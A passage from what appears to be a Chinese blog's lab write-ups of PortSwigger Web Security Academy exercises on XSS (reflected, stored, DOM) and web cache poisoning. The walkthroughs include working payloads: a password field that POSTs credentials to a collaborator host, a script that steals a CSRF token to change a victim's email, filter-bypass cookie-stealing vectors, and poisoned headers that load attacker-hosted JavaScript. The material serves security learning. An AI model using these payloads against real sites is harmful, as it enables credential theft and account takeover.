*/&lt;/script>&lt;/p>\n\n如果我们将这个网站发给我的朋友，那么在对方的网页打开的时候，对方就会自动执行这个恶意的JavaScript脚本。\n如图所示，举个最简单的例子\n\n\n在search框直接插入恶意的JavaScript即可。\n反射型XSS攻击的影响\n执行受害者权限下能执行的任何操作\n查看受害者权限下能查看的任何数据\n修改受害者权限下能修改的任何信息\n以受害者身份与其他用户进行交互\n\n攻击者只需要诱使受害者点击附有反射型XSS payload的链接即会触发\n1A.利用反射型XSS攻击的具体例子1. 利用XSS攻击窃取他人的cookie使用的payload:\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;search?term&#x3D;&lt;script&gt; alert(document.cookie) &lt;&#x2F;script&gt;\n\n2.利用XSS窃取他人的密码payload：\n&lt;input name=username id=username>\n&lt;input type=password name=password onchange=\"if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',&#123;\nmethod:'POST',\nmode: 'no-cors',\nbody:username.value+':'+this.value\n&#125;);\">\n\n3.利用XSS执行CSRF有时为了防止CSRF攻击，服务器会使用CSRF token来防御CSRF，此时对CSRF token进行处理，使得本来防御性的CSRF token失效。这里我们通过XSS攻击执行CSRF。\npayload\n&lt;script>\nvar req = new XMLHttpRequest();\nreq.onload = handleResponse;\nreq.open('get','/my-account',true);\nreq.send();\nfunction handleResponse() &#123;\n    var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1];\n    var changeReq = new XMLHttpRequest();\n    changeReq.open('post', '/my-account/change-email', true);\n    changeReq.send('csrf='+token+'&amp;email=test@test.com')\n&#125;;\n&lt;/script> test@test.com\n\n\n\n很多web网页为了安全问题或者其他问题，会禁用部分标签(可能是WAF,可能是别的),下面讲的四种攻击实例将标签的禁止绕过，并加以利用。\n\n1B.HTML上下文中存在的反射型XSS1.在HTML上下文中绕过WAF进行XSS攻击\n先输入一个基本的XSS向量\n\n&lt;img src=1 onerror=print()>\n\n\n\n然而web界面会进行阻止，在接下来的几个步骤中，我们使用Burp Intruder来测试哪些标签和属性被阻止。\n抓包，设置爆破点，并在XSS攻击表单中选择copy tags to clipboard\n\n\n得到爆破后的结果,发现body标签的状态码为200，使用body标签进行攻击\n\n\n返回Burp Intruder中的Positions选项卡并将搜索词替换为：&lt;body%20=1&gt;\n\n\n再去XSS攻击表单中选择copy events to clipboard\n爆破后得到的events为onresize\n\n\n那么payload应该为&lt;iframe src=&quot;https://ac0d1fee1ec166d6805b1c81003c00ac.web-security-academy.net/?search=&quot;&gt;&lt;body onresize=print()&gt;&quot;&quot; onload=this.style.width=&#39;100px&#39;&gt;并进行url转码\n&lt;iframe src=\"https://ac0d1fee1ec166d6805b1c81003c00ac.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'>       // print里面填写cookie之类的\n\n\n\n点击view exploit即可看到”print”的效果\n2.在除自定义标签外，所有标签都已阻止的情况下，进行XSS攻击payload:\n&lt;script>\nlocation = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';\n&lt;/script>\n\n此payload创建一个带有ID的自定义标记x，其中包含onfocus触发该alert函数的事件处理程序。页面加载后，URL末尾的哈希值会立即关注此元素，从而alert调用有效负载。\n3.web界面阻止事件处理程序和属性，情况下的XSS\n该实验室包含一个带有一些白名单标签的反射型 XSS漏洞，但所有事件和锚点href属性都被阻止。\n\npayload\nhttps://your-lab-id.web-security-academy.net/?search=&lt;svg>&lt;a>&lt;animate attributeName=href values=javascript:alert(1) />&lt;text x=20 y=20>Click me&lt;/text>&lt;/a>\n直接访问以下url\nhttps://your-lab-id.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E\n\n4.在常规的标签被禁止后，使用svg标签绕过\n一开始的几步同在HTML上下文中绕过WAF进行XSS攻击类似，先查找未被禁用的标签。\n\n爆破完成后，查看结果。观察到&lt;svg&gt;，&lt;animatetransform&gt;，&lt;title&gt;，和&lt;image&gt;标签，接收到了200响应。\n\n\n将search参数值设置为&lt;svg&gt;&lt;animatetransform%20=1&gt;\n\n\n再进行events的爆破\n\n\n\npayload\n\nhttps:&#x2F;&#x2F;your-lab-id.web-security-academy.net&#x2F;?search&#x3D;%22%3E%3Csvg%3E%3Canimatetransform%20onbegin&#x3D;alert(1)%3E\n\n5.对HTML标记属性值的反射型XSS\n在此Lab中，输入的&lt;会被单引号给屏蔽，从而无法达到使用的效果。\n\n\n\n这里使用payload进行绕过\n\"onmouseover=\"alert(1)\n\n\n\n6.单引号和反斜杠号被转义\n观察发现自带有单引号，反斜杠号会被转义为\\\\\n\n\n\n使用payload:\n\\'-alert(1)//\n\n\n\n7.编码中有&lt;&gt;\n\n\npayload:\n\n'-alert(1)-'\n\n8.尖括号和双引号被HTML编码，单引号被转义某些应用程序试图通过用反斜杠转义任何单引号字符来防止输入脱离JS字符串。字符前面的反斜杠告诉JS解析器，该字符应按字面解释，而不是作为特殊字符（如字符串终止符）进行解释。在此情况下，应用程序经常会犯未能转义反斜杠字符本身的错误。这意味着攻击者可以使用自己的反斜杠字符来中和应用程序添加的反斜杠。\npayload\n例如，假设输入：\n';alert(document.domain)//\n\n转换为：\n\\';alert(document.domain)//\n\n\n可以使用的payload:\n\n\\';alert(document.domain)//\n这将转换为：\n\n\\\\';alert(document.domain)//\n\n\n\n\npayload:\n\n\\'-alert(1)//\n\n9.&lt;&gt;,&#39;&#39;,&quot;&quot;,\\都被转义payload：\n$&#123;alert(1)&#125;\n\n0x03 存储型XSS\n存储型XSS的基本原理与反射型XSS类似\n存储型XSS可以一直保留在网页上\n\n\n最为简单的例子\n\n\n\n1A:在HTML上下文中的存储型XSS1.输入恶意脚本内容被双引号所屏蔽在此Lab中，输入的内容会被双引号给屏蔽，从而无法达到使用的效果。要求点击发布评论者名字时，产生XSS。\n\n直接提交&lt;script&gt; alert(1) &lt;/script&gt;发现无效\n\n\n\n在Website中填写javascript:alert(1)即可\n\n\n2.输入的”&lt;”被转义，导致无法进行XSS攻击如图所示\n\n\n假设模拟用户将按下以下组合键：\n\nALT+SHIFT+X\nCTRL+ALT+X\nAlt+X\n\n那么payload:\nhttps:&#x2F;&#x2F;ac5d1fdd1e8243bcc06e0d95006300d9.web-security-academy.net?%27accesskey&#x3D;%27x%27onclick&#x3D;%27alert(1)\n\n当用户使用下列组合键的时候，会弹出弹窗。\n3.”&lt;&gt;”与&quot;&quot;被编码，&#39;&#39;和”&quot;被转义\n\npayload：\nhttp:&#x2F;&#x2F;foo?&amp;apos;-alert(1)-&amp;apos;\n\n0x04 DOM型XSS什么是DOM型XSS？我们在这里先介绍有关基于DOM的XSS的一些概念，后面会有专题专门讲DOM相关的漏洞，DOM有一个source和sink，可以理解为DOM操作函数的入口点和出口点，基于DOM的XSS就是因为将入口点的输入传递给出口点的时候被出口点函数执行导致的XSS。常见的source就是URL了，搭配window.location对象访问操作sink触发。对于source和sink的攻击，梨子计划在后面的专题中细讲。这里仅讲解XSS相关的。\n1.如何测试基于DOM的XSS？有两种测试方法，分别为\n\n测试HTML sink\n测试JS执行 sink\n\n1.1测试HTML sink测试HTML sink需要攻击者在sink处(如location.search)填充随机字母数字，然后观察其在HTML页面中的位置。然后观察其上下文，再不断调整payload以观察是否能够将内容从当前标签中脱离出来。\n1.2测试JS执行sink测试JS执行sink比测试HTML sink困难一点，因为可能sink的输入不会显示在页面中，这就需要在sink出下断点进行调试，跟踪变量值的变化，可能sink的输入会赋给其他变量，剩下的操作与上面相同，依然是不断调整输入以触发XSS。\n1.3通过不同的source和sink利用基于DOM的XSS能否成功利用基于DOM的XSS还是要看source和sink是否搭配，这是一个组合的问题，后面burp也给出了他们经过测试的一些source和sink的组合。这里以document.write这个sink为例进行介绍。有的情况是我们写入sink的内容需要先闭合掉前面的元素然后再写我们的payload。而对于innerHTML这个sink，它不接收script、使用onload事件的svg，所以我们可以用使用onload或onerror事件的img或iframe代替。如果应用程序使用了js库(如jQuery)，就可以寻找一些可以更改DOM元素的函数，如jQuery中的attr()函数，例如\n$(function()&#123;\n$('#backLink').attr(\"href\",(new URLSearchParams(window.location.search)).get('returnUrl'));\n&#125;);\n\n上面可以实现更改锚点(#backLink)的属性href的值为参数returnUrl的值，所以我们可以这样构造payload?returnUrl=javascript:alert(document.domain)如果使用的是像AngularJS这种框架，就可以在没有尖括号和事件的情况下执行JS。当HTML元素使用ng-app属性时，就会被AngularJS处理，就可以在双花括号内执行JS并且回显在HTML页面或属性中。下面我们通过5个靶场来深入理解\n\n常见函数导致DOM型XSS\n\n2.DOM型XSS的一些例子2.1. 使用location.search source和document.write sink对照源代码进行绕过即可\n\n\n从图中看，query的值是从URL参数search中获取并且会不经任何处理就拼接到img标签中，这就需要先提前闭合img标签然后再跟着payload，最后的效果是这样的。\npayload多种多样，只要符合闭合原理即可\nimg\">&lt;svg onload=alert(1)>   // 第二个尖括号后面的payload自己构造\n\n\n\n2.2 在select元素内使用location.search source和document.write sink开始代码审计\n\n\n这段代码先会获取URL参数storeId的值然后如果可以获取到值就将其套在option元素中写入到页面中。\n\npayload:\n\n&amp;storeId=\">&lt;/select>&lt;img%20src=1%20onerror=alert(1)>\n\n2.3 使用location.search source和innerHTML sink代码审计\n\n\n发现并无特殊处理，是直接写入到innerHTML中的，所以script和svg都无法使用了，所以payload直接：\n&lt;img src=1 onerror=alert(1)>\n\n2.4 使用location.search source和jQuery锚点属性sink之前我们提到的执行JS sink，就在这道靶场里面体现\n代码审计\n\n\n\n看到returnPath，开始构造payload\n\njavascript:alert(document.cookie)\n\n\n\n3.反射型、存储型的DOM型XSS3.1 反射型的DOM型XSS在JS中发现出现了一个SearchResult.js的新文件，代码审计\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-WebCache中毒漏洞学习","url":"/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","content":"Port WebCache Poison\n\nPortSwigger-WebCache Poisoning 漏洞学习0x01 前言\n师傅们如果做题有问题可以直接在文章下留言，或者是私信我即可，有些地方我个人交代的可能不太好，还请师傅们见谅。\n\n最早听闻 Web Cache Poisoning 是在 HTTP 包里面吧，当时并没有怎么在意，现如今要正式面对它了。\nWeb Cache 不同于 OWASP TOP10 系列的漏洞锋利，它一般是作为一种辅助性手段，地位高于 CORS，低于 CSRF。\nWeb Cache 投毒在很多知名的网站上都有存在的隐患，比如 Google，百度，msn，必应等 …… 给人一种无孔不入的味道\n\n\n0x02 概念明晰\n学漏洞：知概念，晓进攻，懂防御。\n\n先来明晰一下一些基本概念吧。\n1. 什么是 Web Cache理解 Web Cache，我们先用平常浏览 Web 网页的一些例子进行说明。\n有没有发现自己在打开同一个网站的时候，打开那个网站的速度特别快，比如你常设置的首页，在打开的时候异常快速，这就是 Web Cache 的一种情况。\n而 Web Cache 是从服务器 -&gt; Response 这个角度出发考虑的。如果服务器必须单独向每个 HTTP 请求发送 Reponse 回应，则可能会使服务器过载，从而导致延迟问题和较差的用户体验，尤其是在繁忙时期。缓存主要是减少此类问题的一种方法。\n\n轻轻吐槽一句：感觉我们学校的某 OJ 系统就是没有做好 Web Cache，所以大家一起用的时候体验极差。\n\nWeb Cache 位于服务器和用户之间，Web Cache 保存对特定请求的响应。通常在固定的时间内，如果另一个用户随后发送等效请求(也就是很多类似的请求，比如一直刷新界面)，则 Web Cache 只是将缓存的响应的副本直接提供给用户，而无需来自后端的任何交互。这大大减少了服务器上必须处理的重复请求的数量，从而大大减轻了服务器上的负载。\n\n原理如图所示\n\n\n\n2. 如何在 Web Cache 运行流程的基础上进行 Poison？如何在 Web Cache 运行流程的基础上进行 Poison？也就是我们所说的恶意利用，或是恶意构造 Payload\n如果攻击者首先触发服务器缓存附有恶意 Payload 的响应，当其他用户发送相同请求时即会接收到这个恶意的响应。从影响范围来看，一旦成功缓存被投毒的响应，会影响到大量的用户，比起以往某些只能针对某个用户发起的攻击，危害大很多很多。\n\n因而 Web Cache Poisoning 是一种辅助攻击手段，有点扩大战果的味道。\n\n3. Cache Key:缓存键当 Web Cache 收到 HTTP 请求时，它首先必须确定是否存在可以直接提供的 Cache 响应，或者它是否必须转发请求以供后端服务器处理。Web Cache 通过比较请求组件的预定义子集（统称为“缓存键 —— Cache Key”）来标识等效请求。\n\n一般缓存键包括 Request Header 和 Host 头。服务器端只识别设置为缓存键的特征是否相同，这也就导致了 Web 缓存投毒漏洞的产生。\n\n0x03 对于 Web Cache 进行投毒\n这一块的 Exploit 分为两部分，我们后续分开细讲一下。\n\n\n利用，总的来说还是漏洞挖掘的一部分，在这之前，我们略微提一嘴 Web Cache 的危害。\n\nWeb Cache 的危害四个字：扩大战果\n1. 进行 Web Cache Poisoning 的思路\n讲的这一套思路基于已经挖到其他漏洞的前提下，单纯进行 Web Cache Poisoning 的思路。\n\n(1) 找出未被 Web Cache 进行缓存的输入 ———— 例如 GET 请求中的参数，有些 GET 请求的参数会被其他用户先行请求。(2) 从后端服务器诱发被投毒的响应。(3) 得到被缓存的响应。\n这样讲还是太粗略太粗略，我们深入理解一下。\n一、找出未被 Web Cache 进行缓存的输入害得拿出这张原理图\n\n\n我们想要构造 Web Cache 投毒就需要我们的输入能够反馈在响应中，但是如果我们的输入被设置为缓存键，那就不可能有用户发出等效请求 ———— 因为这个地方用户的请求会被拦下来，一看原理图便立马明白了吧 ~\n所以我们需要不断调试直到找到我们的输入既不会是缓存键又可以被反馈在被缓存的响应中。这样才能保证被投毒的响应缓存被投放到受害者那里，Port 推荐了一款插件 Param Miner 来辅助我们寻找这样的不会被缓存的字段。\n\n\n使用比较简单，只需要右键选择 Guess headers 即可。并且为了不给真实用户造成困扰，可以开启 cache buster，后续我们讲一讲基本使用。\n\n\n二、从后端服务器诱发被投毒的响应我们确认了不会被缓存的输入以后，我们就要看服务端是如何处理这个输入的，如果可以动态反馈到响应中，就是我们能够发动 Web 缓存投毒的关键。\n三、得到被缓存的响应我们的输入可以被反馈到响应中还不够，还得能够生成缓存，这样才可以真正地将恶意 Payload 落地。所以我们为此还是要不断调试才能成功找到生成投毒缓存的操作。\n\n\n\n总体来说还是比较抽象的，直接入靶场尝试。\n\n\n\n\n整体的漏洞利用分两部分\n一是基于缓存设计缺陷的 Web Cache Poisoning 攻击\n二是基于缓存实现缺陷的 Web Cache Poisoning 攻击\n\n0x04 基于缓存设计缺陷的 Web Cache Poisoning 攻击1. 使用 Web Cache Poisoning 扩大 XSS 战果因为 XSS 攻击也是有一部分是输入被反馈在响应中，所以 Web Cache 投毒可以与 XSS 相配合。我们以这一个 HTTP 请求为例说明一下。\nGET /en?region=uk HTTP/1.1 \nHost: innocent-website.com \nX-Forwarded-Host: innocent-website.co.uk \n\n\nHTTP/1.1 200 OK \nCache-Control: public \n&lt;meta property=\"og:image\" content=\"https://innocent-website.co.uk/cms/social.png\" />\n\n此处标头的值会动态生成图像 URL，该 URL 将回显于 Response 中。\nX-Forwarded-Host 指定的 URL 会代替 Host 的值被反馈在响应中，并且 X-Forwarded-Host 是不会被缓存的字段，但是Host和请求行是缓存键。\n\n所以所有 Host 为 innocent-website.com 的用户请求 /en?region=uk 时都会接收到被投毒的响应。\n\n\n如果我们要利用的话，POC 如下\n\nGET /en?region=uk HTTP/1.1 \nHost: innocent-website.com \nX-Forwarded-Host: a.\">&lt;script>alert(1)&lt;/script>\" \n\n\nHTTP/1.1 200 OK \nCache-Control: public \n&lt;meta property=\"og:image\" content=\"https://a.\">&lt;script>alert(1)&lt;/script>\"/cms/social.png\" />\n\n\n有时候 Web Cache 也会替换为 JS 资源，例如下面这一 HTTP 请求。\n\nGET / HTTP/1.1 \nHost: innocent-website.com \nX-Forwarded-Host: evil-user.net // 写恶意的 EXP\nUser-Agent: Mozilla/5.0 Firefox/57.0 \n\nHTTP/1.1 200 OK \n&lt;script src=\"https://evil-user.net/static/analytics.js\">&lt;/script>\n\n接下来我们以这一靶场来体会体会利用 X-Forwarded-Host 头进行 Web Cache Poisoning 的案例。\n\nLab: Web cache poisoning with an unkeyed header\n打开靶场，我们去商品界面进行抓包，通过修改 X-Forwarded-Host 参数为 www.baidu.com，进行 Web 缓存测试。\n\n\n从上图来看，现在是没有产生 Web 缓存的，然后我们插入到 X-Forwarded-Host 字段会替换掉本应是 Host 字段的值。这样就相当于 resources/js/tracking.js 这个文件是可以伪造的，然后我们再发包观察回显。\n\n\n我们再发包之后，X-Cache 从 miss 变成了 hit，这就代表着产生了 Web 缓存。\n\n接着，我们去到 Exploit Server，将 Payload 写入此文件下。\n\n\n\n然后随便找一个靶场里面的商品，抓包，把 Exploit Server 的域名作为 X-Forwarded-Host 的参数，然后在 Repeater 当中重新发包几次让 Web 缓存生成。\n发包之前需要先找到一个未被键入的参数，例如 ?a=1 或者是其他的参数，发包直至 Cache 为 hit；再删除参数，发包直至 Cache 为 hit。\n再到对应的商品界面进行刷新，即可触发 alert(document.cookie)\n\n这里千万别把 X-Forwarded-Host 放到最下面一行，不然一直会发包失败。这道题如果踩坑的师傅可以私信我。\n\n2. 对不被缓存的 Cookie 进行投毒这种情况的利用较为苛刻，情况也比较少。我们以此 HTTP 请求为例\nGET &#x2F;blog&#x2F;post.php?mobile&#x3D;1 HTTP&#x2F;1.1 \nHost: innocent-website.com \nUser-Agent: Mozilla&#x2F;5.0 Firefox&#x2F;57.0 \nCookie: language&#x3D;pl; \nConnection: close\n\n我们看到应用程序通过 Cookie 中的 language 的值来调整网站的语言，当该请求生成响应后，等效请求的用户收到的就是波兰语(pl)的页面了。当然了，这种攻击方式比较少，因为很容易因为影响到正常用户被发现。\n\nLab: Web cache poisoning with an unkeyed cookie\n\n我们先抓包，添加一些参数探测试一下我们输入的值会去向何处。\n\n\n\n我们可以看到 Cookie 中的 “fehost” 字段被自动拼接到Response 回应中的 script 元素下，那么我们可以修改这个字段的值实现 XSS 攻击。\npayload\nfehost&#x3D;someString&quot;-alert(1)-&quot;someString\n\n需要发几次包，使得 X-Cache 的值变为 hit，Port 这里时而会很卡，如果发包几次之后还是没有回显的话就去 MyAccout 界面，再回到发包的界面试一试。\n\n\n3. 使用多个 HTTP Header 发起 Web Cache 投毒\n简单来说便是利用 Web Cache 投毒扩大 CSRF 的战果。\n\n我们前面学习的两种 Web Cache 投毒都是基于未键入的请求，而我们要发起更高级的攻击时，需要使用多个 HTTP Header。\n\n\n我们以这一 HTTP 包为例\nGET &#x2F;random HTTP&#x2F;1.1 \nHost: innocent-site.com \nX-Forwarded-Proto: http &#x2F;&#x2F;这里也有可以是 X-Forwarded-Scheme\n\nHTTP&#x2F;1.1 301 moved permanently \nLocation: https:&#x2F;&#x2F;innocent-site.com&#x2F;random\n\n假设一个网站需要使用 HTTPS 协议进行安全通信，但是如果我们使用 HTTP 协议访问该网站，则会自动触发一个指向 Host 的重定向，那么我们在 Request 请求当中修改 X-Forwarded-Host 修改为一些恶意网站，即可造成 Web Cache 投毒的进一步攻击。\n修改包，发起攻击\nGET &#x2F;random HTTP&#x2F;1.1 \nHost: innocent-site.com \nX-Forwarded-Proto: http\nX-Forwarded-Host: evil.com\n\nHTTP&#x2F;1.1 301 moved permanently \nLocation: https:&#x2F;&#x2F;innocent-site.com&#x2F;evil.com\n\n\nLab: Web cache poisoning with multiple headers\n\n我们先按照上道题目一样，使用 X-Forwarded-Host 进行攻击，发觉之前的 js 路径失效了，我们无法进行攻击。\n\n\n\n根据多 HTTP Header 攻击的思路，我们加上 X-Forwarded-Scheme 这一标头，并将其赋值 “HTTP”\nX-Forwarded-Scheme: HTTP\nX-Forwarded-Host: www.baidu.com\n\n\n\n出现了 Location，也就是重定向。\n证明该靶场存在 Web Cache Poisoning 的隐患之后，我们还是和上题一样构造 Payload。\n\n\n发包这里，我们去到 GET 请求的 /resources/js/tracking.js 接口下，这个接口的请求我们点击 f12，在新的页面打开此 js。\n先带上参数 ?cb=1234，这是第一步：找出未被 Web Cache 进行缓存的输入。\n\n\n点击 “Follow redirection”，若出现 alert(document.cookie 则说明成功。\n\n\n再将 ?cb=1234 删除，发包即可。\n\n\n4. 通过 Cache-Control 导致信息泄露\n这里主要是介绍了一下 Vary 头 与 Cache-Control\n我们在 HTTP Request 包中添加入 Via 与 Cache-Control 便可得到泄露的信息。\n\nCache-Control当响应包含有关清除缓存的频率或当前缓存的响应的时长的信息时，我们可以得到一个叫做 “有效期” 的信息；有效期可以帮助我们去计算时间从而达到 Web Cache Poisoning。\nVary HeaderVary 头指定了一些可以被视为缓存键的字段列表，常见的如 User-Agent 头，应用程序通过其可以仅向指定用户群投放响应，也可以利用这个特点向特定用户群发动 Web 缓存投毒攻击。\n\nLab: Targeted web cache poisoning using an unknown header\n抓包 GET 请求，接口为 /，使用 Para Miner 查找可以添加的标头。\n\n\n\n在 HTTP Request 标头中添加 X-Host，证明存在 Web Cache 投毒\n\n\n\n接着，制作 Payload\n\n\n尝试了与之前一致的攻击手段，无法攻击成功，后来看了 Solution 才知道与 Vary 头 有关系，因为此处的 User-Agent 也是缓存键，我们去到 Blog 文章下发送一段钓鱼性质的评论，钓到其他人的 User-Agent。\npayload:\n&lt;img src=\"https://your-exploit-server-id.web-security-academy.net/foo\" />\n\n\n\n再去到 Access Log 当中复制受害者的 UA。每隔几秒刷新一次页面，直到看到不同用户（ip不同）发出的请求。我们把受害者的 UA 粘贴进去，再进行如上的攻击。\n\n\n接着替换 UA，并发包\n\n\n5. 对 DOM 型漏洞进行 Web Cache 投毒不仅可以通过 Web Cache 投毒 JS 文件，还可以导入恶意的 JSON 字符串，例如\n&#123;\"someProperty\" : \"&lt;svg onload=alert(1)>\"&#125;\n\n如果这条 Payload 被传递到恶意的 sink 就可能触发基于 DOM 的漏洞，如果想要让网站加载恶意 JSON 就需要 CORS 授权允许跨站。我们以这一 HTTP 请求举例进行说明。\nHTTP&#x2F;1.1 200 OK \nContent-Type: application&#x2F;json \nAccess-Control-Allow-Origin: * \n&#123; \n    &quot;malicious json&quot; : &quot;malicious json&quot; \n&#125;\n\n\n这一种攻击方式对代码审计的要求比较高，大家可以耐心看一看。\n\n\nLab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria\n使用 Param Miner 进行扫描，使用 Param Miner 扫描比较慢，不要着急 ~ ；最后发现在接口 / 中存在 Web Cache Poisoning，且可伪造字段为 X-Forwarded-Host\n\n\n\n在 Repeater 当中尝试 X-Forwarded-Host 头，发包。\n\n\n\n这里 data json 当中，”host” 到底作为何用，我们去追踪一下。后续发现此标头会覆盖 data.host 传递给 initGeoLocate() 函数的变量。\n\n\n那也就是说，这里的 initGeoLocate(&#39;//&#39; + data.host + &#39;/resources/json/geolocate.json&#39;，传入的 JSON 数据容易受到 DOM 型 XSS 的攻击。我们转战那一容易受到影响的 JSON 文件。\n\n根据我们前文所说的需要启用 CORS，我们去到 Exploit Server 处，在头部添加 ACAO，并写下 Payload。Payload 添加一个 JSON 对象，值为 DOM 型 XSS 的 Payload。\n\n\n\n接着还是以之前的攻击方式 ———— 添加一个未被键入的参数，发包直至 Cache 为 hit；再删除参数，发包直至 Cache 为 hit。\n\n\n6. Web Cache 完整投毒过程学习\n这里是 Port 给我们尝试综合性 Web Cache 投毒的一中学习方式。将上面的攻击手段结合&#x2F;综合到一起来。\n\n\nLab: Combining web cache poisoning vulnerabilities\n进入靶场抓包，使用 Param Miner 探测 Web Cache，探测结果出 HTTP 包支持 X-Forwarded-Host 和 X-Original-URL 标头。\n\n\n修改 X-Forwarded-Host 的值，发包。\n\n\n这里 host 被修改为了我们输入的 X-Forwarded-Host，和上一题一样，我们去查找 host 被用于何处。\n\n\n如此，我们去到 /resources/json/translations.json 代码审计。\n\n\nTranslations.js\n因为只翻译首页，所以所谓的翻译就是一对一的替换，然后我们留意一下红框部分，就是说除了英语其他的都会执行翻译，也就是说除了英语以外的我们都能用来插入 DOM-XSS 语句。考虑到乱码问题，我们选择 en-gb 这个，虽然也是英语，但是因为代码里严格匹配 en，所以这个也是可以用来插入的，而且也不用考虑乱码的问题，现在我们去 Exploit Server 写入 DOM 型 XSS 的 Payload。\nPayload 如图所示\n\n\n通过选取 Language 为 espanol 抓取接口为 /?localized=1 这一包，因为你选择翻译的时候会请求这个页面，然后修改 X-Forwarded-Host 字段为 Exploit Server 的，并产生 Web Cache。\n但是这是翻译页面，我们需要在首页加入一个 X-Original-URL 字段指向翻译页面，这样访问首页的人就都会被重定向到这个页面了。\n\n0x05 基于 Cache Key 缺陷的 Web Cache 投毒攻击传统的攻击经常通过将 Payload 注入查询字符串或者是 URL 路径实现，但是请求行是缓存键，这就导致不可能会有用户发出等效请求，也就接收不到投毒响应缓存。\n\n但是如果有 CDN 的话，他们会将缓存键内容进行某些处理之后再存入缓存。这些处理一般有一下三种\n\n排除查询字符串\n\n过滤掉特定的查询参数\n\n规范缓存键中的输入\n\n\n尤其是前两种，即使我们注入 payload 到查询字符串或参数中，用户也可能收到被投毒的响应缓存。\n基于 Cache Key 缺陷的 Web Cache 投毒的基本步骤\n基于 Cache Key 缺陷的 Web Cache 投毒一般三步走\n\n1. 辨认接收到的响应是来自缓存还是服务器这一步被称作辨认 Cache oracle，国内暂时也有很多文章对这一用词进行翻译与解释，我个人把它作为一种简单的反馈辨认。\n\n我们需要知道我们接收到的响应是来自缓存还是服务器。\n\n这一反馈可以从如下三种地方获得。\n1)某些 HTTP 头。2)网页中能够欸我们修改的地方，例如添加评论这种行为。3)不同的响应时间 —— 可以理解为 SQL 注入当中的时间盲注类似。\n有的时候应用程序会使用第三方的缓存组件，此时可以通过查阅相关文档的方式得知缓存的过程。例如，基于 Akamai 的网站可能支持 Pragma：akamai-x-get-cache-key，它可以在响应标头中显示缓存键。\n2. 观察缓存对缓存键是否有其他的处理比如剔除 Host 中的端口号等，我们以下面这一 HTTP 请求为例，在这一 HTTP 请求当中，Host 值会被动态拼接进 Location 中。\nGET &#x2F; HTTP&#x2F;1.1 \nHost: vulnerable-website.com \n\nHTTP&#x2F;1.1 302 Moved Permanently \nLocation: https:&#x2F;&#x2F;vulnerable-website.com&#x2F;en \nCache-Status: miss\n\n若是对上面的请求添加端口，响应如下\nGET &#x2F; HTTP&#x2F;1.1 \nHost: vulnerable-website.com:1337 \n\nHTTP&#x2F;1.1 302 Moved Permanently \nLocation: https:&#x2F;&#x2F;vulnerable-website.com:1337&#x2F;en \nCache-Status: miss\n\n我们再去掉端口号重新发送请求\nGET &#x2F; HTTP&#x2F;1.1 \nHost: vulnerable-website.com \n\nHTTP&#x2F;1.1 302 Moved Permanently \nLocation: https:&#x2F;&#x2F;vulnerable-website.com:1337&#x2F;en \nCache-Status: miss\n\n发现已经生成缓存，但是缓存是我们加了端口号发出时的响应版本。这就说明端口号是不会加入缓存键中的。\n3. 进行漏洞利用\n前文我们说到 Web Cache 投毒这一攻击手段是用来扩大战果的，所以最后一步我们需要将漏洞与 Web Cache 投毒联合使用。\n\n上述为基于 Web Cache 键( Key ) 缺陷的一些漏洞，我们接下来详细学习一下攻击手段。\n\n1. 通过未被缓存的端口进行攻击缓存键可能只会缓存域名或主机名而不缓存端口号。所以我们可以利用这个特点发动如 DDOS (向任意端口号发出大量请求)，若网站允许端口不为数字，则我们可以进行 XSS 攻击。\n2. 通过未被缓存的查询字符串攻击若查询的字符串未被键入，则发送的查询字符串即使值不同也会产生相同的响应缓存，这就产生了等效请求。\n基本的攻击手段 ———— 比如是一个 GET 请求，我们在接口处添加此参数  ?evil=&#39;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;，这一段字符串若未被缓存，则其他用户也会因为等效请求而受到攻击。\n探测不被缓存的查询字符串有的 Web 程序并不会在回显中反映出是否产生了缓存，我们可以在其他请求头中下手，例如加在 Accept-Encoding 字段中\nAccept-Encoding: gzip, deflate, cachebuster \nAccept: *&#x2F;*, text&#x2F;cachebuster \nCookie: cachebuster&#x3D;1 \nOrigin: https:&#x2F;&#x2F;cachebuster.vulnerable-website.com\n\n其实也可以在 Param Miner 开启动态的缓存粉碎机(cachebuster)。还有一种办法就是修改不同的路径，但是仍然可以的到相同的响应缓存。对应不同的系统有着不同的路径\n\nApache: GET &#x2F;&#x2F;Nginx: GET &#x2F;%2FPHP: GET &#x2F;index.php&#x2F;xyz.NET GET &#x2F;(A(xyz)&#x2F;\n\nExploit of 不被缓存的查询字符串查询字符串不被缓存会扩大 XSS 的攻击影响，因为附有 XSS  Payload 的查询字符串的请求在缓存看来与普通请求无异，但是普通用户可能就会接收到被投毒的响应缓存，这就产生了等效请求。\n\nLab: Web cache poisoning via an unkeyed query string)\n\n先抓包，去到 / 这一接口。使用我们上述的攻击手段，在 GET 请求的参数中添加 ?evil=&#39;/&gt;&lt;script&gt;alert(1)&lt;/script&gt; 即可，记得发包至 X-Cache: hit 的状态哦 ~\n\n\n\n3. 仅有几个不被缓存的查询参数时在上一攻击手段当中，我们直接输入 ?evil 作为查询参数也能够成功发送请求，但在很多 Web 程序当中会对查询参数进行限制；又或者会将仅仅几个参数执行不缓存的操作。\n这时就需要用到 Fuzz 测试，我们先探测一下哪些查询参数是可以被利用的，再对这些可利用的参数进行是否会被缓存的测试。\n\n但是这样一来，因为能够利用的参数有限，所以我们造成的攻击面也会少几分。\n\n\nLab: Web cache poisoning via an unkeyed query parameter\n\n这里的 Fuzz 过程我就先跳过啦，最后得出可用的参数为 utm_content，构造 Payload\n\n&#x2F;?utm_content&#x3D;&#39;&#x2F;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;\n记得发包至 X-Cache: hit 的状态\n\n\n4. 